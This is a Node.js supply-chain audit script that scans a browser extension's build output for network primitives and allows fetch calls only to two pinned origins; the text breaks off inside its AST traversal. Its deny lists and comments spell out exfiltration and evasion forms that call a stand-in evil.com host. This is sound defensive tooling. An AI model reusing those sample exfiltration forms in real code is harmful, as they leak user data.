#!/usr/bin/env node
// ──────────────────────────────────────────────────────────────────────
// audit-network.mjs — AST-based post-build supply-chain guard
//
// Parses every SCRIPT file in the build output with Babel, walks the AST
// for network-capable constructs, and checks the result against a
// PER-CONTEXT census with EXACT counts. There are two contexts and they
// get different promises:
//
//   worker (the manifest's background.service_worker)
//     Exactly two `fetch` CALL sites beyond the lockdown's own reference.
//     Each call's DESTINATION is resolved statically through the bundle
//     (parameter → unique call site → `new URL(path, origin)` → literal)
//     and must come out as one of the two pinned origins — ONE CALL SITE
//     EACH, so a second GitHub fetch cannot occupy the keyserver's slot;
//     each init object must match a pinned shape exactly. They are the
//     GitHub SSH-key lookup and the keys.openpgp.org certificate lookup
//     (SECURITY.md §7, §13; T-GITHUB-LOOKUP-DISCLOSURE,
//     T-KEYSERVER-LOOKUP-DISCLOSURE).
//
//   page (every other script — side panel, welcome, shared chunks)
//     No `fetch` beyond the two wasm loaders, and neither may have a
//     destination that resolves to a remote origin; no XHR / WebSocket /
//     EventSource / RTCPeerConnection / sendBeacon / new Worker /
//     new Function / eval at all; and no absolute URL literal outside a
//     pinned set of XML namespaces and human-facing href targets.
//
// WHY PER-CONTEXT, AND WHY EXACT COUNTS.
// The previous version had one flat allowlist keyed on a path substring
// with a `chunks/` wildcard, and NO notion of destination — it flagged
// `fetch(x)` regardless of what `x` was. Adding a sixth allowlist entry
// for the GitHub call would have downgraded the guarantee from "no
// network" to "no unexpected network" and given the panel no separate
// promise. Worse, it turned out not even to need the sixth entry: the
// lockdown's own `credentials:"omit"` allowlist entry already covered the
// new call site, because the call site also passes `credentials: "omit"`.
// A substring allowlist that broad is not a guard.
//
// Counts are exact rather than upper bounds so that DELETING a guard
// fails as loudly as adding a leak. If a legitimate change moves these
// numbers, change the numbers here in the same commit and say why.
//
// ── WHAT THIS DOES NOT PROVE ──────────────────────────────────────────
//
// 1. This scanner catches DIRECT references only. Alias-based evasion
//    (const f = fetch; f()) is handled at runtime by lib/network-lockdown.ts
//    which hooks the actual APIs. Together they form defence-in-depth:
//      - Scanner:  catches obvious additions a dep shouldn't have
//      - Lockdown: intercepts calls regardless of aliasing/indirection
//
// 2. The URL-literal checks are a CHANGE DETECTOR, not a proof. They see
//    a destination that is SPELLED OUT in the bundle, including one
//    spelled with escape sequences ("\x68ttps://…") or as a
//    protocol-relative "//host.tld/…", and they see a split scheme
//    ("https:" + "//host"). They do NOT see a host assembled from
//    fragments that never contain "://" ("evil" + "." + "tld"), from
//    character codes, or from data that is not a literal at all. What the
//    check buys is that the plain, readable ways to name a remote
//    destination cannot be added without failing the build. The runtime
//    layers (CSP, then the lockdown) are what actually stop a request.
//
// 3. Destination resolution (§ RESOLVER below) is a bounded, single-file
//    constant-propagation, not a full dataflow analysis. It follows
//    unique bindings, single call sites and `new URL(path, base)`. It
//    proves the ORIGIN the one worker fetch is built from; it does not
//    prove the path or the query string (see T-GITHUB-CSP-SCOPE), and it
//    would give up — loudly, as an error — rather than guess if the
//    bundle shape changed.
//
// 4. The panel is NOT "free of network primitives", and this file has
//    never been able to claim that honestly. The wasm loader is a real
//    `fetch`, and the lockdown reads `globalThis.fetch` precisely in order
//    to replace it. The defensible claim is narrower and is the one made
//    here: THE SIDE PANEL BUNDLE CONTAINS NO CODE THAT CAN NAME A REMOTE
//    DESTINATION. Its two fetches take an extension-relative URL (checked:
//    neither resolves to a remote origin); its absolute URL literals are
//    XML namespaces and href targets, neither of which is a connect
//    destination; and `sidepanel.html` pins the panel realm to
//    `connect-src 'self'` with a meta CSP the browser enforces.
//
// Usage:  node scripts/audit-network.mjs [output-dir]
//         Default output-dir: .output/chrome-mv3
//         --census dumps the observed census instead of judging it,
//         which is how you re-pin the numbers below after a real change.
// ──────────────────────────────────────────────────────────────────────
import { readdirSync, readFileSync, statSync } from "node:fs";
import { extname, join, posix, relative } from "node:path";
import { parse } from "@babel/parser";
import _traverse from "@babel/traverse";

// Handle both ESM default and CJS interop
const traverse =
  typeof _traverse === "function" ? _traverse : _traverse.default;

const OUTPUT_DIR =
  process.argv.slice(2).find((a) => !a.startsWith("--")) ||
  ".output/chrome-mv3";
// `--census` rather than an env var: turbo.json declares the env vars the
// build may read, and that file is not this script's to edit.
const CENSUS_MODE = process.argv.includes("--census");

// ── Dangerous globals / constructors ────────────────────────────────
// Direct references to these as identifiers are suspicious.
const DANGEROUS_GLOBALS = new Set([
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "RTCPeerConnection",
  "RTCDataChannel",
  "RTCSctpTransport",
  "importScripts",
]);

// Property names that are dangerous when called on an object.
// Only flagged on MemberExpression calls (obj.sendBeacon(), etc.)
const DANGEROUS_METHODS = new Set([
  "sendBeacon", // navigator.sendBeacon
  "createDataChannel", // RTCPeerConnection.createDataChannel
  "createOffer", // RTCPeerConnection.createOffer
  "createAnswer", // RTCPeerConnection.createAnswer
  "setRemoteDescription", // RTCPeerConnection.setRemoteDescription
  "addIceCandidate", // RTCPeerConnection.addIceCandidate
]);

// Dangerous when used with `new`
const DANGEROUS_CONSTRUCTORS = new Set([
  "Worker",
  "SharedWorker",
  "Function", // new Function("return fetch")()
  "Image", // new Image().src = "https://evil.com?data=..."
]);

// ── The permitted remote origins ────────────────────────────────────
// The two key-discovery lookups, and nothing else. Note these are the
// ORIGINS; the manifest CSP narrows each one further to a path prefix
// (which CSP does honour — verified: /users/<u>/keys is allowed,
// /gists is blocked).
//
// EACH ORIGIN GETS THE SAME TREATMENT, and the checks below are written
// over the list rather than over one name: exactly one built file may
// contain the literal, that file must be the worker, and the worker's
// set of remote origin literals must be exactly this list. A third
// entry is therefore a deliberate edit in several places, not a
// one-character change.
const GITHUB_ORIGIN = "https://api.github.com";
const KEYSERVER_ORIGIN = "https://keys.openpgp.org";
const WORKER_ORIGINS = [GITHUB_ORIGIN, KEYSERVER_ORIGIN];

/** Path prefix the manifest CSP pins each origin to, in the order the
 *  `connect-src` directive lists them. */
const CONNECT_SRC_PATHS = {
  [GITHUB_ORIGIN]: "/users/",
  [KEYSERVER_ORIGIN]: "/vks/v1/",
};

// ── Contexts ────────────────────────────────────────────────────────
// The worker file is READ FROM THE MANIFEST (`background.service_worker`)
// rather than hardcoded, so renaming the entry cannot silently move the
// worker into the page context — but it must still be the file the census
// below was pinned against, so a rename fails loudly instead of quietly
// re-pointing the audit.
//
// Treating "page" as "every script that is not the worker" is deliberately
// blunt: it means a new page entrypoint, or a chunk nobody expected, is
// held to the panel's promise by default rather than by being listed.
const EXPECTED_WORKER_FILE = "background.js";

// ── Expected primitive census — EXACT counts ────────────────────────
// Keys are `${kind}:${name}` from the AST scan. Anything observed that is
// not listed, or listed with a different count, fails the build.
//
// worker:
//   ref:fetch   — `const _fetch = globalThis.fetch` in network-lockdown.ts.
//                 The lockdown must read the global to replace it; this is
//                 the reference, not a call.
//   call:fetch  — TWO, and only two: lib/github/fetch-keys.ts and
//                 lib/keyserver/fetch-key.ts. Every outbound request this
//                 extension can make. Counted together, pinned apart —
//                 see PINNED_CALL_SITES.
//
// page:
//   ref:fetch              — the same single lockdown reference, landing in
//                            the shared chunk both pages preload.
//   call:fetch             — exactly two, both wasm loaders (the sidepanel
//                            entry chunk and the wasm-bindgen glue), each
//                            fetching an extension-relative URL.
//   dynamic-import:import() — the code-split import of the local gpg_wasm
//                            chunk. Its specifier is pinned below.
//
// The minifier strips the names off the lockdown's throwing stubs
// (`function XMLHttpRequest(){throw...}` becomes anonymous), which is why
// there are no `ref:XMLHttpRequest`-style entries here. Do not "restore"
// them if a minifier change makes them reappear without checking that the
// stubs are what produced them.
const EXPECTED_CENSUS = {
  worker: {
    "ref:fetch": 1,
    "call:fetch": 2,
  },
  page: {
    "ref:fetch": 1,
    "call:fetch": 2,
    "dynamic-import:import()": 1,
  },
};

// ── Call-site pinning ───────────────────────────────────────────────
// Counts alone would let a leak swap places with a legitimate call. Every
// `call:fetch` and `dynamic-import` finding must ALSO match exactly one of
// these pins, and every pin must match exactly one finding, so a malicious
// call cannot inherit a neighbour's budget.
//
// A pin may require any of:
//   snippet          — a substring of the enclosing expression's source.
//                      WEAK on its own: the snippet spans the whole call,
//                      so anything the attacker also writes satisfies it.
//                      Only used where a stronger check is not available.
//   destinationOrigin — the statically resolved origin of argument 0.
//                      `null` means "must NOT resolve to a remote origin"
//                      (an unresolvable or extension-relative destination
//                      both satisfy that). A string means "must resolve,
//                      and must be exactly this".
//   init             — exact shape of the fetch init object: every listed
//                      key must be present with that literal value, and no
//                      key outside `init` ∪ `initOptionalKeys` may appear.
const PINNED_CALL_SITES = {
  worker: [
    {
      kind: "call",
      name: "fetch",
      reason: "lib/github/fetch-keys.ts -- the GitHub SSH-key lookup",
      // THE pin that matters. `redirect:` used to be it, and it was not a
      // pin at all: the snippet spans the whole CallExpression, so
      // `fetch(anythingAtAll, { redirect: "error" })` satisfied it and
      // inherited this slot in the count. The destination is what the
      // threat entries actually claim, so the destination is what is
      // checked — see § RESOLVER.
      destinationOrigin: GITHUB_ORIGIN,
      // The init object is pinned structurally (AST, not substring) so
      // the call keeps the properties the security story quotes: no
      // cookies, no redirect-following, no cache entry.
      init: {
        method: "GET",
        credentials: "omit",
        redirect: "error",
        cache: "no-store",
      },
      // Non-literal options the call legitimately carries.
      initOptionalKeys: ["signal", "headers"],
    },
    {
      kind: "call",
      name: "fetch",
      reason:
        "lib/keyserver/fetch-key.ts -- the keys.openpgp.org certificate lookup",
      // Same pin, different origin. Because a pin must match exactly one
      // finding AND a finding exactly one pin, the two entries cannot
      // absorb each other: two fetches to api.github.com leave this pin
      // unmatched and fail, which is the property a bare count of 2
      // would not have.
      destinationOrigin: KEYSERVER_ORIGIN,
      init: {
        method: "GET",
        credentials: "omit",
        redirect: "error",
        cache: "no-store",
      },
      initOptionalKeys: ["signal", "headers"],
    },
  ],
  // Both page fetches are wasm loaders. They are pinned on wasm-bindgen
  // glue idioms (`arrayBuffer()`, `instance:`) rather than on minified
  // identifier names, which change on every unrelated code edit — plus the
  // hard requirement that neither destination resolves to a remote origin.
  page: [
    // sidepanel entry chunk: fetch the .wasm blob, then initSync it
    {
      kind: "call",
      name: "fetch",
      snippet: "arrayBuffer()",
      destinationOrigin: null,
      reason: "sidepanel entry chunk: fetches the extension-local .wasm",
    },
    // gpg_wasm chunk: the wasm-bindgen init loader
    {
      kind: "call",
      name: "fetch",
      snippet: "instance:",
      destinationOrigin: null,
      reason: "gpg_wasm chunk: the wasm-bindgen init loader",
    },
    // the code-split import of the local gpg_wasm chunk
    {
      kind: "dynamic-import",
      name: "import()",
      snippet: "gpg_wasm",
      destinationOrigin: null,
      reason: "code-split import of the local gpg_wasm chunk",
    },
  ],
};

// ── Expected absolute URL literals — EXACT sets ─────────────────────
// Extracted from the raw source rather than the AST, so a fragment left
// over from string concatenation ("https://" on its own) is still seen.
//
// The panel's set is NOT empty, and pretending otherwise would be the
// dishonest version of this check. What is in it, and why none of it is a
// connect destination:
//
//   http://                      network-lockdown's scheme test
//                                (`url.startsWith("http://")`), not a URL.
//   chrome-extension://          network-lockdown's own-origin test, and
//                                wxt's runtime URL helpers. Not remote.
//   http://www.w3.org/…          XML/SVG/MathML namespace identifiers.
//                                These are passed to createElementNS /
//                                setAttributeNS; nothing ever fetches them.
//   https://react.dev/errors/    React's minified-error decoder link, put
//                                into a thrown Error's message.
//   https://amibeingpwned.com    our own site, rendered as an href.
//   https://github.com/…         the repo link, rendered as an href.
//   https://developer.chrome.com/…  a documentation link, rendered as an
//                                href, next to the CRX signing UI.
//   chrome://extensions/shortcuts   the browser's own shortcuts page,
//                                rendered as an href. Not a remote origin
//                                and not fetchable by a page at all.
//
// href targets are inert without a click, and `frame-src 'none'` plus the
// panel's `connect-src 'self'` meta CSP mean neither the page nor a
// compromised dependency can turn one into a request. They are listed
// because the point of this check is that the SET does not grow quietly.
const EXPECTED_URL_LITERALS = {
  worker: [
    "http://", //
    "chrome-extension://",
    ...WORKER_ORIGINS,
  ],
  page: [
    "http://",
    "chrome-extension://",
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1998/Math/MathML",
    "http://www.w3.org/1999/xlink",
    "http://www.w3.org/XML/1998/namespace",
    "https://react.dev/errors/",
    "https://amibeingpwned.com",
    "https://developer.chrome.com/docs/webstore/update#protect-package-updates",
    "https://github.com/Am-I-Being-Pwned/PGP-Tools",
    "chrome://extensions/shortcuts",
    // date-fns embeds this doc link in the message it throws when a
    // format string uses a Unicode token. Never fetched; never rendered.
    "https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md",
  ],
};

// ── Manifest policy — EXACT ─────────────────────────────────────────
// The permission arrays are checked as exact SETS, not by denylist. A
// denylist has to guess what a future Chrome adds; an exact set fails on
// anything at all appearing, including the ones nobody thought of. Every
// entry here is one the extension actually uses:
//
//   sidePanel      the whole UI is a side panel
//   contextMenus   right-click → encrypt/decrypt entries
//   storage        the local vault (chrome.storage.local)
//   idle           auto-lock on idle
//   downloads      (optional) "save decrypted file", requested on demand;
//                  the FSA save picker crashes the side panel, so this is
//                  the only way to hand a user a file
//
// NOTE the network-capable ones that are therefore forbidden by
// construction: declarativeNetRequest (rewrite/redirect any request),
// webRequest, nativeMessaging (a pipe to a local binary, outside every
// CSP), proxy, debugger, scripting/tabs/cookies (read other origins).
const EXPECTED_PERMISSIONS = ["sidePanel", "contextMenus", "storage", "idle"];
const EXPECTED_OPTIONAL_PERMISSIONS = ["downloads"];

// Manifest keys that must be ABSENT, with the reason each one matters.
// "Absent", not "empty": a build step that adds one of these is close to
// invisible in a review of a generated manifest diff.
const FORBIDDEN_MANIFEST_KEYS = {
  host_permissions:
    "the GitHub lookup is unauthenticated CORS and needs no host permission; a host permission attaches the user's cookies-and-all origin privileges to a request we deliberately make anonymous",
  optional_host_permissions:
    "same as host_permissions -- an optional one is still one prompt away from being granted",
  sandbox:
    "a sandboxed page is exempt from the extension_pages CSP ENTIRELY, so a single sandbox.pages entry is a complete bypass of connect-src",
  content_scripts:
    "this extension injects nothing into web pages; a content script runs in a page's realm where our CSP does not apply",
  declarative_net_request:
    "DNR rules can redirect or rewrite requests without any code in the bundle",
  externally_connectable:
    "nothing outside the extension may open a message port into the worker",
  web_accessible_resources:
    "no extension resource is exposed to web origins; a WAR page is loadable (and framable) by any site that matches",
};

// ── Collect files ───────────────────────────────────────────────────
// Everything in the output, relative and posix-normalised so it can be
// compared against manifest/HTML references directly.
function collectFiles(dir, base = dir) {
  const files = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      files.push(...collectFiles(full, base));
    } else {
      files.push(relative(base, full).split(/[\\/]/).join("/"));
    }
  }
  return files;
}

// ── File classification ─────────────────────────────────────────────
// Derived from the build output and the manifest rather than from a
// hardcoded ".js and .css" list. The old version scanned exactly those two
// extensions, so a chunk emitted as `.mjs` — or a manifest-referenced
// script with any other extension — was invisible to BOTH the census and
// the URL scan. The rule now is the other way round: a file is inert only
// if its extension is on the list below, and everything else is parsed as
// script (and fails the build if it will not parse).
const INERT_EXTENSIONS = new Set([
  ".png",
  ".jpg",
  ".jpeg",
  ".gif",
  ".webp",
  ".ico",
  ".bmp",
  ".avif",
  ".svg", // not loadable as script from an extension page; img-src only
  ".wasm", // bytes, not script; the CSP has no wasm origin to widen
  ".json", // manifest.json and friends; validated separately
  ".map", // source maps
  ".woff",
  ".woff2",
  ".ttf",
  ".otf",
  ".eot",
  ".md",
  ".txt",
  ".webmanifest",
]);

function classifyFiles(allFiles, referencedScripts) {
  const scripts = [];
  const css = [];
  const html = [];
  const inert = [];
  for (const rel of allFiles) {
    const ext = extname(rel).toLowerCase();
    if (ext === ".css") css.push(rel);
    else if (ext === ".html" || ext === ".htm") html.push(rel);
    else if (referencedScripts.has(rel) || !INERT_EXTENSIONS.has(ext))
      scripts.push(rel);
    else inert.push(rel);
  }
  return { scripts, css, html, inert };
}

// Resolve a reference (manifest paths are root-relative; HTML `src` may be
// root-relative or relative to the page) to an output-relative path.
function resolveRef(ref, fromFile = "") {
  const clean = ref.split("?")[0].split("#")[0];
  if (/^[a-z][a-z0-9+.-]*:/i.test(clean) || clean.startsWith("//")) return null;
  if (clean.startsWith("/")) return clean.slice(1);
  return posix.normalize(posix.join(posix.dirname(fromFile || "."), clean));
}

// Every script the manifest can cause to run.
function manifestScriptRefs(manifest) {
  const refs = [];
  const bg = manifest.background ?? {};
  if (typeof bg.service_worker === "string") refs.push(bg.service_worker);
  for (const s of Array.isArray(bg.scripts) ? bg.scripts : []) refs.push(s);
  for (const cs of Array.isArray(manifest.content_scripts)
    ? manifest.content_scripts
    : []) {
    for (const s of cs.js ?? []) refs.push(s);
  }
  return refs.map((r) => resolveRef(r)).filter(Boolean);
}

// Every HTML page the manifest can cause to be opened.
function manifestPageRefs(manifest) {
  const refs = [
    manifest.side_panel?.default_path,
    manifest.action?.default_popup,
    manifest.browser_action?.default_popup,
    manifest.options_page,
    manifest.options_ui?.page,
    manifest.devtools_page,
    ...Object.values(manifest.chrome_url_overrides ?? {}),
  ];
  return refs
    .filter((r) => typeof r === "string")
    .map((r) => resolveRef(r))
    .filter(Boolean);
}

const HTML_SCRIPT_SRC_RE = /<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi;
const HTML_INLINE_SCRIPT_RE =
  /<script\b(?![^>]*\bsrc\s*=)[^>]*>([\s\S]*?)<\/script>/gi;

function htmlScriptRefs(html, fromFile) {
  HTML_SCRIPT_SRC_RE.lastIndex = 0;
  return [...html.matchAll(HTML_SCRIPT_SRC_RE)]
    .map((m) => resolveRef(m[1], fromFile))
    .filter(Boolean);
}

function htmlInlineScripts(html) {
  HTML_INLINE_SCRIPT_RE.lastIndex = 0;
  return [...html.matchAll(HTML_INLINE_SCRIPT_RE)].filter(
    (m) => m[1].trim() !== "",
  );
}

// ── Extract source snippet around a node ────────────────────────────
function snippetAt(source, node, contextChars = 80) {
  const start = Math.max(0, node.start - 10);
  const end = Math.min(source.length, node.end + contextChars);
  return source.slice(start, end);
}

// ── Absolute URL literals ───────────────────────────────────────────
// Deliberately scans raw text, not string-literal AST nodes: a fragment
// that is being concatenated is exactly what we want to see.
//
// Three patterns, because one regex over the raw bytes is escapable in
// three cheap ways and all three are worth closing:
//
//   SCHEME_URL_RE       any `scheme://host…`, not just http(s) — so
//                       `ws://`, `blob:`-lookalikes and `chrome-extension://`
//                       all land in the pinned set rather than under it.
//   PROTO_RELATIVE_RE   `"//evil.tld/x"` — a real destination with no
//                       scheme at all, which the old http(s)-only regex
//                       could not see. Anchored to a quote and required to
//                       look like a hostname, so `a // b` and comments do
//                       not match.
//   SPLIT_SCHEME_RE     `"https:" + "//" + host` — the scheme half of a
//                       split URL, recorded as the token `https:`.
//
// Each is run over the raw source AND over a copy with JS string escapes
// decoded, so `"\x68ttps://evil.tld"` and `"https://evil.tld"` are
// caught too. What remains open, and is documented as open: a host built
// from fragments that never contain `://` or a leading `//`.
const SCHEME_URL_RE = /[a-z][a-z0-9+.-]{1,31}:\/\/[^"'`\s\\)>]*/gi;
const PROTO_RELATIVE_RE =
  /["'`](\/\/[a-z0-9-]+(?:\.[a-z0-9-]+)+[^"'`\s\\)>]*)/gi;
const SPLIT_SCHEME_RE = /["'`](https?:)(?!\/\/)/gi;

// Decode the escape forms that can spell an ASCII character inside a JS
// string literal. Length is not preserved (offsets are not used for URL
// findings, only the matched text is reported).
function decodeStringEscapes(source) {
  return source
    .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) =>
      String.fromCharCode(parseInt(h, 16)),
    )
    .replace(/\\u\{([0-9a-fA-F]{1,6})\}/g, (m, h) => {
      const cp = parseInt(h, 16);
      return cp <= 0x10ffff ? String.fromCodePoint(cp) : m;
    })
    .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) =>
      String.fromCharCode(parseInt(h, 16)),
    )
    .replace(/\\\//g, "/");
}

function urlLiteralsIn(source) {
  const found = new Set();
  const decoded = decodeStringEscapes(source);
  for (const text of decoded === source ? [source] : [source, decoded]) {
    for (const [re, group] of [
      [SCHEME_URL_RE, 0],
      [PROTO_RELATIVE_RE, 1],
      [SPLIT_SCHEME_RE, 1],
    ]) {
      re.lastIndex = 0;
      for (const m of text.matchAll(re)) found.add(m[group]);
    }
  }
  return [...found];
}

// ── Module specifiers ───────────────────────────────────────────────
// Used only to assert that the worker bundle is self-contained. If Vite
// ever hoists worker code into a shared chunk, the single-file check on the
// GitHub origin literal stops meaning what it says — so fail there first.
const MODULE_SPECIFIER_RE = /\b(?:from|import)\s*["']([^"']+)["']/g;

function moduleSpecifiersIn(source) {
  MODULE_SPECIFIER_RE.lastIndex = 0;
  return [...source.matchAll(MODULE_SPECIFIER_RE)].map((m) => m[1]);
}

// ── RESOLVER: what destination can this call actually name? ─────────
// A bounded constant-propagation over one file's AST. It exists because
// the worker pin used to be the substring `redirect:` on a snippet that
// spanned the whole call — which made the assertion "one fetch whose init
// mentions redirect", not "one fetch to api.github.com".
//
// It follows, at most RESOLVE_DEPTH steps:
//   - string and template literals (the static head of a template)
//   - `a + b`  → the left operand (the scheme/origin end of a concat)
//   - an identifier → its unique binding: an initialiser, or a single
//     assignment to a declared-then-assigned `let`
//   - a parameter → the argument at that index, IF the enclosing function
//     has exactly one call site in the file
//   - a call of a local function with exactly one `return` → that return
//     expression, with the callee's parameters bound to this call's args
//   - `new URL(path, base)` → base, which is what fixes the origin
//
// It gives up (returns null) on anything else: two call sites, a
// conditional, a computed member, a value from another module. Giving up
// is not a pass — the worker pin REQUIRES a resolved origin, so a bundle
// shape this cannot follow fails the build and asks to be re-derived.
const RESOLVE_DEPTH = 16;

function callSitesOf(fnPath) {
  const id = fnPath.node.id;
  if (!id) return [];
  const binding = fnPath.parentPath?.scope.getBinding(id.name);
  if (!binding) return [];
  return binding.referencePaths
    .filter(
      (r) =>
        r.parentPath?.isCallExpression() && r.parentPath.node.callee === r.node,
    )
    .map((r) => r.parentPath);
}

function functionForCallee(path, name) {
  const binding = path.scope.getBinding(name);
  if (!binding) return null;
  if (binding.path.isFunctionDeclaration()) return binding.path;
  if (binding.path.isVariableDeclarator()) {
    const init = binding.path.get("init");
    if (
      init.node &&
      (init.isFunctionExpression() || init.isArrowFunctionExpression())
    )
      return init;
  }
  return null;
}

function resolveStatic(path, env, depth, seen) {
  if (!path || !path.node || depth > RESOLVE_DEPTH) return null;
  if (seen.has(path.node)) return null;
  seen.add(path.node);
  const node = path.node;

  switch (node.type) {
    case "StringLiteral":
      return node.value;

    case "TemplateLiteral": {
      const head = node.quasis[0]?.value.cooked ?? "";
      if (head !== "") return head;
      if (node.expressions.length > 0)
        return resolveStatic(path.get("expressions.0"), env, depth + 1, seen);
      return null;
    }

    case "BinaryExpression":
      if (node.operator !== "+") return null;
      return resolveStatic(path.get("left"), env, depth + 1, seen);

    case "AwaitExpression":
    case "TSNonNullExpression":
      return resolveStatic(path.get("argument"), env, depth + 1, seen);

    case "ParenthesizedExpression":
      return resolveStatic(path.get("expression"), env, depth + 1, seen);

    case "Identifier": {
      const binding = path.scope.getBinding(node.name);
      if (!binding) return null;
      if (env.has(binding)) {
        const bound = env.get(binding);
        return resolveStatic(bound.path, bound.env, depth + 1, seen);
      }
      if (binding.kind === "param") {
        const fnPath = binding.scope.path;
        if (!fnPath.node.params) return null;
        const index = fnPath.node.params.indexOf(binding.path.node);
        if (index < 0) return null;
        const sites = callSitesOf(fnPath);
        // More than one call site: the argument is not a constant here.
        if (sites.length !== 1) return null;
        const args = sites[0].get("arguments");
        return resolveStatic(args[index], new Map(), depth + 1, seen);
      }
      if (binding.path.isVariableDeclarator()) {
        if (binding.path.node.init)
          return resolveStatic(binding.path.get("init"), env, depth + 1, seen);
        // `let t; try { t = f(x) }` — one assignment is still a constant.
        const writes = binding.constantViolations.filter(
          (p) => p.isAssignmentExpression() && p.node.operator === "=",
        );
        if (writes.length === 1)
          return resolveStatic(writes[0].get("right"), env, depth + 1, seen);
      }
      return null;
    }

    case "NewExpression":
    case "CallExpression": {
      const callee = node.callee;
      if (callee.type !== "Identifier") return null;
      const args = path.get("arguments");
      // `new URL(path, base)` — the base fixes the origin.
      if (node.type === "NewExpression" && callee.name === "URL") {
        if (args.length >= 2)
          return resolveStatic(args[1], env, depth + 1, seen);
        if (args.length === 1)
          return resolveStatic(args[0], env, depth + 1, seen);
        return null;
      }
      const fnPath = functionForCallee(path, callee.name);
      if (!fnPath) return null;
      const returns = [];
      fnPath.get("body").traverse({
        Function(p) {
          p.skip();
        },
        ReturnStatement(p) {
          if (p.node.argument) returns.push(p.get("argument"));
        },
      });
      if (returns.length !== 1) return null;
      const childEnv = new Map();
      fnPath.node.params.forEach((param, i) => {
        if (param.type !== "Identifier" || !args[i]) return;
        const paramBinding = fnPath.scope.getBinding(param.name);
        if (paramBinding) childEnv.set(paramBinding, { path: args[i], env });
      });
      return resolveStatic(returns[0], childEnv, depth + 1, seen);
    }

    default:
      return null;
  }
}

const LOCAL_SCHEMES = new Set([
  "chrome-extension:",
  "moz-extension:",
  "chrome:",
  "about:",
  "blob:",
  "data:",
  "filesystem:",
  "file:",
]);

// The resolved value as an ORIGIN, or null if it is not a remote absolute
// URL. A protocol-relative "//host/x" IS remote and is reported as such.
function originOf(value) {
  if (typeof value !== "string") return null;
  const candidate = value.startsWith("//") ? `https:${value}` : value;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(candidate)) return null;
  try {
    const url = new URL(candidate);
    // Schemes that cannot reach the network off-device. `chrome:` and the
    // extension schemes are local surfaces; blob:/data:/filesystem: carry
    // their payload with them.
    if (LOCAL_SCHEMES.has(url.protocol)) return null;
    return url.origin;
  } catch {
    return null;
  }
}

// The fetch init object, read structurally. Returns
// { keys, values } where values holds only statically-known strings.
function readInitObject(callPath) {
  const arg = callPath.get("arguments")[1];
  if (!arg || !arg.node || arg.node.type !== "ObjectExpression") return null;
  const keys = [];
  const values = {};
  for (const prop of arg.node.properties) {
    if (prop.type !== "ObjectProperty" || prop.computed) return null;
    const key =
      prop.key.type === "Identifier"
        ? prop.key.name
        : prop.key.type === "StringLiteral"
          ? prop.key.value
          : null;
    if (key === null) return null;
    keys.push(key);
    if (prop.value.type === "StringLiteral") values[key] = prop.value.value;
    else if (
      prop.value.type === "TemplateLiteral" &&
      prop.value.expressions.length === 0
    )
      values[key] = prop.value.quasis[0].value.cooked;
  }
  return { keys, values };
}

// ── Main scan ───────────────────────────────────────────────────────
function scanFile(source, relPath, contextOf) {
  let ast;
  try {
    ast = parse(source, {
      sourceType: "module",
      allowImportExportEverywhere: true,
      plugins: ["dynamicImport", "importMeta"],
      errorRecovery: true,
    });
  } catch (e) {
    return { findings: [], parseError: e.message };
  }

  const findings = [];

  function addFinding(kind, name, path, detail) {
    const node = path.node ?? path;
    findings.push({
      file: relPath,
      context: contextOf(relPath),
      kind,
      name,
      detail: detail || name,
      start: node.start,
      end: node.end,
      snippet: snippetAt(source, node),
      path: path.node ? path : null,
    });
  }

  traverse(ast, {
    // ── Calls: fetch(), navigator.sendBeacon(), window["fetch"]() ──
    CallExpression(path) {
      const callee = path.node.callee;

      // eval()
      if (callee.type === "Identifier" && callee.name === "eval") {
        addFinding("eval", "eval", path);
        return;
      }

      // Dynamic import(): import("https://evil.com/x.js")
      // Babel parses this as CallExpression with callee type "Import"
      if (callee.type === "Import") {
        addFinding("dynamic-import", "import()", path);
        return;
      }

      // Direct identifier call: fetch(), XMLHttpRequest(), etc.
      if (callee.type === "Identifier" && DANGEROUS_GLOBALS.has(callee.name)) {
        addFinding("call", callee.name, path);
        return;
      }

      // Method call: obj.sendBeacon(), obj.createDataChannel(), obj.fetch()
      if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        const prop = callee.property.name;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path);
          return;
        }
      }

      // Computed property calls: window["fetch"](), obj["sendBeacon"]()
      if (
        callee.type === "MemberExpression" &&
        callee.computed &&
        callee.property.type === "StringLiteral"
      ) {
        const prop = callee.property.value;
        if (DANGEROUS_GLOBALS.has(prop) || DANGEROUS_METHODS.has(prop)) {
          addFinding("call", prop, path, `computed["${prop}"]`);
        }
      }
    },

    // ── new X(): new WebSocket(), new Worker(), new Function() ──────
    NewExpression(path) {
      const callee = path.node.callee;
      let name = null;

      if (callee.type === "Identifier") {
        name = callee.name;
      } else if (
        callee.type === "MemberExpression" &&
        !callee.computed &&
        callee.property.type === "Identifier"
      ) {
        name = callee.property.name;
      }

      if (
        name &&
        (DANGEROUS_GLOBALS.has(name) || DANGEROUS_CONSTRUCTORS.has(name))
      ) {
        addFinding("new", name, path, `new ${name}`);
      }
    },

    // ── Dynamic import() — ImportExpression variant ─────────────────
    ImportExpression(path) {
      addFinding("dynamic-import", "import()", path);
    },

    // ── Bare references: const x = fetch (not a call, but captures it) ──
    // Catches alias setup: const f = fetch, const f = globalThis.fetch
    // These are flagged as "ref" so the census can distinguish them
    // from actual calls.
    Identifier(path) {
      if (!DANGEROUS_GLOBALS.has(path.node.name)) return;

      // Skip if this identifier is being called (handled by CallExpression)
      // or constructed (handled by NewExpression)
      const parent = path.parent;
      if (parent.type === "CallExpression" && parent.callee === path.node)
        return;
      if (parent.type === "NewExpression" && parent.callee === path.node)
        return;

      // Skip property access keys: obj.fetch (the "fetch" on the right)
      if (
        parent.type === "MemberExpression" &&
        parent.property === path.node &&
        !parent.computed
      )
        return;

      // Skip object keys: { fetch: value }
      if (parent.type === "ObjectProperty" && parent.key === path.node) return;

      // This is a bare reference — someone is reading the global (likely aliasing)
      addFinding("ref", path.node.name, path, `ref:${path.node.name}`);
    },

